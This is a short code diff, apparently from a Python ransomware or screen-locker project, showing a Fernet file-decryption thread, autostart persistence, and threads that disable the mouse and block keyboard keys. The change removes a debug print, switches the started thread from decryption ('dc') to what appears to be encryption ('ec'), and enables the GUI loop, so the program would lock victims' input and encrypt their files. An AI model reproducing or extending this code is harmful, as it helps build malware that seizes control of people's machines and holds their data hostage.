@@ -94,7 +94,6 @@ class Decryption(threading.Thread):
         for file in file_paths:
             with open(file, "rb") as binary_file:
                 content = binary_file.read()
-                print(content)
             decrypted_content = Fernet(self.KEY).decrypt(content)
             with open(file, "wb") as binary_file:
                 try:
@@ -222,6 +221,6 @@ create_autostart_dir()
 threading.Thread(target=disable_mouse, daemon=True).start()
 threading.Thread(target=block_keys, daemon=True).start()
 
-dc.start()
+ec.start()
 
-# window.mainloop()
+window.mainloop()
